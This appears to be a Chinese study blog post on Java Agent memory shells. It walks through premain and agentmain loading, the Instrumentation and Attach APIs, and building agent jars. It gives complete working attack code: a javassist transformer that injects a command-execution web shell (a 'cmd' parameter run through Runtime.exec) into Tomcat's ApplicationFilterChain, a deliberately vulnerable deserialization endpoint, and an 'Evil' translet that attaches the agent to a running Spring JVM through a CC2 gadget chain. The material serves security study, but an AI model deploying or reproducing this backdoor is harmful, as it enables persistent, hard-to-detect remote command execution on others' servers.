# Agent 内存马学习



## Agent 内存马

之前学 java agant 内存马时，学过这个，太久没看又给忘了，这里再复习一次

[浅谈 Java Agent 内存马 – 天下大木头 (wjlshare.com)](http://wjlshare.com/archives/1582)



### premain-启动时加载 agent

#### Demo

可在命令行利用 **-javaagent** 来实现启动时加载

主要是通过写 premain 函数并在 MANIFEST 中指定 Premain-Class 来在启动另外的类前，先加载 premain 类，懒得创建文件再去编译写 jar 文件了，这里我个简单的一键生成测试 jar 包的脚本

```java
import javassist.*;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

public class _SimpleExampleMaker {
    private static final ClassPool pool = ClassPool.getDefault();

    public static void main(String[] args) throws Throwable {
        // 创建一个 premain 和需要 被代理的类，具体函数实现请修改 makeClassWithMethod 的第一个参数
        Class<?> testClass = makeClassWithMethod("TestClass",
                "public static void main(String[] args) { System.out.println(\"Main class Running\"); }"
        );

        Class<?> premainDemo = makeClassWithMethod("PremainDemo",
                "public static void premain(String agentArgs, java.lang.instrument.Instrumentation inst) throws Exception {System.out.println(agentArgs.isEmpty() ? \"null\" : agentArgs);System.out.println(\"premain method is invoked!\");}"
        );

        //  创建两个类的jar文件
        makePremainJar(premainDemo,"agent.jar",true);
        makePremainJar(testClass,"demo.jar",false);

        // 写好后执行下面的内容：
        // java -javaagent:agent.jar[=options] -jar demo.jar
        // 例如: java -javaagent:agent.jar=koishi -jar demo.jar

    }

    public static Class<?> makeClassWithMethod(String className, String methodBody) throws Throwable {
        CtClass ctClass = pool.makeClass(className);
        CtMethod ctMethod = CtNewMethod.make(methodBody, ctClass);
        ctClass.addMethod(ctMethod);
        ctClass.writeFile("premain/src/main/java/javas");
        return ctClass.toClass();
    }


    public static void makePremainJar(Class compileClass, String jarName, boolean is_premain) throws Throwable {
        String jarFilePath = "premain/src/main/java/jars/" + jarName;
        String className = compileClass.getName() + ".class";

        // 创建 Manifest 并设置内容
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        if (is_premain) {
            manifest.getMainAttributes().put(new Attributes.Name("Premain-Class"), compileClass.getName());
        } else {
            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());
        }

        // 将 class 和  Manifest 写入 jar 文件
        try (FileOutputStream fos = new FileOutputStream(jarFilePath);
             JarOutputStream jos = new JarOutputStream(fos, manifest)) {
            jos.putNextEntry(new JarEntry(className));
            byte[] bytes = pool.get(compileClass.getName()).toBytecode();
            jos.write(bytes);
            jos.closeEntry();
            System.out.println("JAR file created successfully!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

运行上面的 java 代码后在 jars 目录下执行下面的内容：

```
java -javaagent:agent.jar[=options] -jar demo.jar
java -javaagent:agent.jar=koishi -jar demo.jar
```

会发现输入以下内容

```java
koishi
premain method is invoked!
Main class Running  
```

可以发现 premain 确实在主要类之前执行了，而且 premain 方法的第一个参数 agentArgs 我们也是可传入的。



#### 动态修改字节码

在实现 premain 的时候，我们除了像上面的例子那样能获取到 agentArgs 参数，还可以获取 Instrumentation 实例。

Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果。

在 Instrumentation 中增加了名叫 Transformer 的 Class 文件转换器，转换器可以改变二进制流的数据，Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。

查看 Instrumentation  接口中的类方法：

```java
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

    ......
}
```

简单讲一下 addTransformer，getAllLoadedClasses，retransformClasses 三个方法的作用



##### getAllLoadedClasses

getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class。



##### retransformClasses

retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果。



##### addTransformer-Demo

addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器。如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true

写个简单的测试

**MainDemo.java**

```java
package _InstrumentationTest;

public class MainDemo {
    public static void main(String[] args) {
        System.out.println("I'm Main!!!");
    }
}
```



**PremainDemo.java**

```java
package _InstrumentationTest;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class PremainDemo implements ClassFileTransformer {


    public static void premain(String agentArgs, Instrumentation inst) {
        // 创建类转换器实例
        PremainDemo transformer = new PremainDemo();
        inst.addTransformer(transformer);
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return new byte[0];
    }
}
```

这里实现了 ClassFileTransformer 接口并自定义了 transform 方法，主要作用是输出被拦截的类名。



**Test.java** 

```java
package _InstrumentationTest;

import javassist.ClassPool;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

public class Test {
    private static final ClassPool pool = ClassPool.getDefault();

    public static void main(String[] args) throws Throwable{
        makePremainJar(MainDemo.class,"I_main.jar",false);
        makePremainJar(PremainDemo.class,"I_premain.jar",true);
    }

    public static void makePremainJar(Class compileClass, String jarName, boolean is_premain) throws Throwable {
        String jarFilePath = "premain/src/main/java/jars/" + jarName;
        String className = compileClass.getName().replace(".","/") + ".class";

        // 创建 Manifest 并设置内容
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        if (is_premain) {
            // 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true
            manifest.getMainAttributes().put(new Attributes.Name("Can-Redefine-Classes"), "true");
            manifest.getMainAttributes().put(new Attributes.Name("Can-Retransform-Classes"), "true");
            // 设置 Premain-Class
            manifest.getMainAttributes().put(new Attributes.Name("Premain-Class"), compileClass.getName());

        } else {
            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());
        }

        // 将 class 和  Manifest 写入 jar 文件
        try (FileOutputStream fos = new FileOutputStream(jarFilePath);
             JarOutputStream jos = new JarOutputStream(fos, manifest)) {
            jos.putNextEntry(new JarEntry(className));
            byte[] bytes = pool.get(compileClass.getName()).toBytecode();
            jos.write(bytes);
            jos.closeEntry();
            System.out.println("JAR file created successfully!");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

本类将上面的两个 java 处理为 jar 文件，并设置好 manifest 的内容，启动后可以发现输出了很多内容，我们也可以写一个简单的 spring 服务，通过 premain 的方式注入自己的 filter 内容（以 filter 为例）



##### addTransformer-注入内存马

通过之前对内存马的学习， `org.apache.catalina.core.ApplicationFilterChain`下的 `internalDoFilter` 或者 `doFilter` 方法

都拥有`Request`和`Response`参数，修改一个就可以控制所有的请求与响应。

这里使用 javassist 对被拦截的类方法进行修改，修改如下：

```java
package _InstrumentationTest;

import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class PremainDemo implements ClassFileTransformer {
    private static final String targetClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static void premain(String agentArgs, Instrumentation inst) {
        // 创建类转换器实例
        PremainDemo transformer = new PremainDemo();
        inst.addTransformer(transformer);

    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/",".");
        if (className.equals(targetClassName)){
            System.out.println("Find the Inject Class: " + targetClassName);
            ClassPool pool = ClassPool.getDefault();
            // 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错
            pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  $1;\n" +
                        "javax.servlet.http.HttpServletResponse res = $2;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                // 将 c 从 classpool 中删除以释放内存
                c.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```



随后将该内容打 jar 包，之后将其启动

```powershell
java -javaagent:I_premain.jar -jar SpringDemo.jar
```

![image-20240311154518684](R:\languages\Java\study\Agent_Tech\pic\image-20240311154518684.png)

发现注入成功。



### agentmain-启动后加载 agent

我们内存马注入的情况都是处于 JVM 已运行了的情况，所以上面的方法就不是很有用，不过在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent ，然而 Attach API 在 tool.jar 中，jvm 启动时是默认不加载该依赖的，需要我们在 classpath 中额外进行指定

启动后加载 agent 通过新的代理操作来实现：agentmain，使得可以在 main 函数开始运行之后再运行

和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类

```java
public static void agentmain (String agentArgs, Instrumentation inst)
public static void agentmain (String agentArgs)
```

要求和之前类似，这里我们去实现 agentmain 方法，还要在`META-INF/MANIFEST.MF`中加入`Agent-Class`

Attach API 很简单，只有 2 个主要的类，都在 `com.sun.tools.attach` 包里面。着重关注的是`VitualMachine`这个类。

（所以记得导入本地的 tools.jar 作为依赖）



#### VirtualMachine

VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。

```java
public abstract class VirtualMachine {
    // 获得当前所有的JVM列表
    public static List<VirtualMachineDescriptor> list() { ... }

    // 根据pid连接到JVM
    public static VirtualMachine attach(String id) { ... }

    // 断开连接
    public abstract void detach() {}

    // 加载agent，agentmain方法靠的就是这个方法
    public void loadAgent(String agent) { ... }

}
```



#### VirtualMachineDescriptor

VirtualMachineDescriptor 是一个描述虚拟机的容器类，配合 VirtualMachine 类完成各种功能。



#### 获取Java程序进程

可以使用自带的 `jps -l` 命令去查看

![image-20240311214358589](R:\languages\Java\study\Agent_Tech\pic\image-20240311214358589.png)

也可以通过代码去获取

```java
	public static void main(String[] args) {
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor virtualMachineDescriptor : list) {
            System.out.println(virtualMachineDescriptor+"\n"+virtualMachineDescriptor.id());
        }
    }
```



#### Demo

知道上面的内容后，就可以自己简单写个项目手动为其添加 agent.jar

先写个 ClassFileTransformer 的实现类，并自定义实现 transform  方法

```java
package Demo;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class AgentDemo implements ClassFileTransformer {
    public static void agentmain(String agentArgs, Instrumentation instrumentation) {
        instrumentation.addTransformer(new AgentDemo(), true);
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println("加载类："+className);
        return classfileBuffer;
    }
}
```



打 jar 包

```java
package Demo;

import javassist.ClassPool;
import java.io.*;
import java.util.jar.*;

public class _Maker {
    private static final ClassPool pool = ClassPool.getDefault();

    public static void main(String[] args) throws Throwable{
        makePremainJar(AgentDemo.class,"agentmain.jar",null,true);
    }

    public static void makePremainJar(Class compileClass, String jarName, String libPath, boolean is_premain) throws Throwable {
        String jarFilePath = "agentmain/src/main/java/Demo/jars/" + jarName;
        String className = compileClass.getName().replace(".","/") + ".class";

        // 创建 Manifest 并设置内容
        Manifest manifest = new Manifest();
        manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
        if (is_premain) {
            // 代理的类还需要添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true
            manifest.getMainAttributes().put(new Attributes.Name("Can-Redefine-Classes"), "true");
            manifest.getMainAttributes().put(new Attributes.Name("Can-Retransform-Classes"), "true");
            // 设置 Premain-Class
            manifest.getMainAttributes().put(new Attributes.Name("Agent-Class"), compileClass.getName());
        } else {
            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());
        }

        // 将 class 和  Manifest 写入 jar 文件
        try (FileOutputStream fos = new FileOutputStream(jarFilePath);
             JarOutputStream jos = new JarOutputStream(fos, manifest)) {
            jos.putNextEntry(new JarEntry(className));
            byte[] bytes = pool.get(compileClass.getName()).toBytecode();
            jos.write(bytes);

            // 如果有 jar 依赖需要打入，则进行操作
            if(libPath != null && !libPath.isEmpty()){
                File[] dependencyFiles = new File(libPath).listFiles();
                if (dependencyFiles!=null && dependencyFiles.length!=0){
                    for (File dependencyFile : dependencyFiles) {
                        String extraJarPath = dependencyFile.getAbsolutePath();
                        addJarToJar(jos, extraJarPath);
                    }
                }
            }
            jos.closeEntry();
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("JAR file created successfully!");
    }

    private static void addJarToJar(JarOutputStream jos, String jarFilePath) throws IOException {
        JarFile jarFile = new JarFile(jarFilePath);
        jarFile.stream().forEach(jarEntry -> {
            if (!jarEntry.getName().equals("META-INF/MANIFEST.MF") && !jarEntry.getName().equals("META-INF/")) {
                try {
                    jos.putNextEntry(new JarEntry(jarEntry.getName()));
                    InputStream inputStream = jarFile.getInputStream(jarEntry);
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                        jos.write(buffer, 0, bytesRead);
                    }
                    inputStream.close();
                    jos.closeEntry();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        });
        jarFile.close();
    }
}
```



运行一下主类：

```java
package Demo;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import java.util.List;

public class MainDemo {
    public static void main(String[] args) throws Exception{
        String path = "agentmain/src/main/java/Demo/jars/agentmain.jar";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor v:list){
//            System.out.println(v.displayName());
            if (v.displayName().contains("MainDemo")){
                System.out.println("已找到目标类，将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接，并将 agent.jar 发送给虚拟机");
                VirtualMachine vm = VirtualMachine.attach(v.id());
                // 获取连接后将 agent.jar 发送给虚拟机
                vm.loadAgent(path);
                // 移除连接
                vm.detach();
            }
        }
    }
}
```

可以发现成功调用了 agent.jar，并输出了加载的类名

![image-20240313084226042](R:\languages\Java\study\Agent_Tech\pic\image-20240313084226042.png)



#### 注入内存马

这里还是以 Filter 内存马为例

spring 写个 cc2 的漏洞环境

```xml
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
```

写个反序列化接口

```java
    @RequestMapping(value = {"/poc"})
    @ResponseBody
    public String poc(@RequestParam("poc") String poc) {
        byte[] bpoc = Base64.decodeBase64(poc);
        try {
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bpoc));
            ois.readObject();
            ois.close();
        }catch (Exception e){
            e.printStackTrace();
        }
        return "wow!";
    }
```



生成 Filter 内存马的 agent.jar , 记得遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义，否则 ApplicationFilterChain 会修改失败。

```java
package AgentMemShell;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.LoaderClassPath;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;

public class AgentDemo implements ClassFileTransformer {
    private static final String targetClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation instrumentation) {
        instrumentation.addTransformer(new AgentDemo(), true);
        Class[] classes = instrumentation.getAllLoadedClasses();
        for (Class clas:classes){
            if (clas.getName().equals(targetClassName)){
                try{
                    instrumentation.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace("/",".");
        if (className.equals(targetClassName)){
            System.out.println("Find the Inject Class: " + targetClassName);
            ClassPool pool = ClassPool.getDefault();
            // 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错
            pool.appendClassPath(new LoaderClassPath(Thread.currentThread().getContextClassLoader()));
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  $1;\n" +
                        "javax.servlet.http.HttpServletResponse res = $2;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                // 将 c 从 classpool 中删除以释放内存
                c.detach();
                return bytes;
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return classfileBuffer;
    }
}
```

打包 agent.jar 的时候，顺便把 tools.jar 也一起打进去，否则还需要去目标机器加载，不然就会出现找不到 VirtualMachine 类的问题。我们打入一个jar包，通过 urlclassloader 去获取一个 classloader 就可以来加载我们需要的 VirtualMachine 类了。

![image-20240313112914457](R:\languages\Java\study\Agent_Tech\pic\image-20240313112914457.png)



接着就需要想办法将我们的 agent.jar 加载进去

大致思路还是获取到 jvm 的 pid 号之后，调用 loadAgent 方法将 agent.jar 注入进去，通过反射调用方法即可。（假如服务存在文件上传的口子，能给我们上传 jar）

```java
package AgentMemShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Evil extends AbstractTranslet {
    static {
        try {
            String path = "R:\\languages\\Java\\study\\Agent_Tech\\agentmain\\src\\main\\java\\AgentMemShell\\jars\\agentmain.jar";
            String springApplication = "com.example.springdemo.SpringDemoApplication";

            java.net.URL url = new java.io.File(path).toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
//            ClassLoader classLoader = ClassLoader.getSystemClassLoader();

            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list", null);
            java.util.List list = (java.util.List) listMethod.invoke(MyVirtualMachine, null);
            System.out.println("Running JVM list ...");
            for (int i = 0; i < list.size(); i++) {
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName", null);
                String name = (String) displayName.invoke(o, null);
                // 这里的 if 条件根据实际情况进行更改,不加也行，附加在全部的程序上
                if (name.contains(springApplication)) {
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id", null);
                    String id = (String) getId.invoke(o, null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach", new Class[]{String.class});
                    Object vm = attach.invoke(o, new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent", new Class[]{String.class});
                    loadAgent.invoke(vm, new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach", null);
                    detach.invoke(vm, null);
                    System.out.println("Agent.jar Inject Success !!");
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

之后再使用 CC2 去加载这个 Evil 类的字节码就行了。

![image-20240313120236311](R:\languages\Java\study\Agent_Tech\pic\image-20240313120236311.png)































































































